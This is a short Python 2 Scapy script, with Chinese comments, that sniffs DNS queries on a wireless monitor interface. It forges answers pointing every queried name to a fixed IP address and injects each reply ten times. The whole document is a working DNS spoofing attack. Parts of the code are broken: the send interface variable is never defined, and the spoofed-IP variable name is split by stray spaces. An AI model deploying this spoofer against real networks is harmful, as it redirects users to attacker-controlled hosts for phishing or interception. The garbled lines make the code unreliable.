from scapy.all import *

snif_iface = 'mon0'
recv_iface = 'mon0'
cheat_ip = '1.1.1.1'

def prn(pkt):
    #删除各层的长度和校验和
    del(pkt[UDP].len)
    del(pkt[UDP].chksum)
    del(pkt[IP].len)
    del(pkt[IP].chksum)
    
    resp = pkt.copy()
    
    #交换各地址及端口
    resp.FCfield = 2L
    resp.addr1, resp.addr2, resp.addr3 = pkt.addr2, pkt.addr1, pkt.addr3
    resp.src, resp.dst = pkt.dst, pkt.src
    resp.sport, resp.dport = pkt.dport, pkt.sport

    #改变DNS首部
    resp[DNS].qr = 1L
    resp[DNS].ra = 1L
    resp[DNS].ancount = 1
    
    #添加DNS Answer
    resp[DNS].an = DNSRR(rrname=pkt.qd.name, type='A', rclass='IN', rdata=ch    eat_ip)

    sendp(resp, iface=send_iface, verbose=False, count=10)
    print 'send response to %s for %s'%(resp.dst, resp.qd.qname)

if __name__ == '__main__':
    sniff(prn=prn, filter='udp dst port 53', iface=snif_iface)
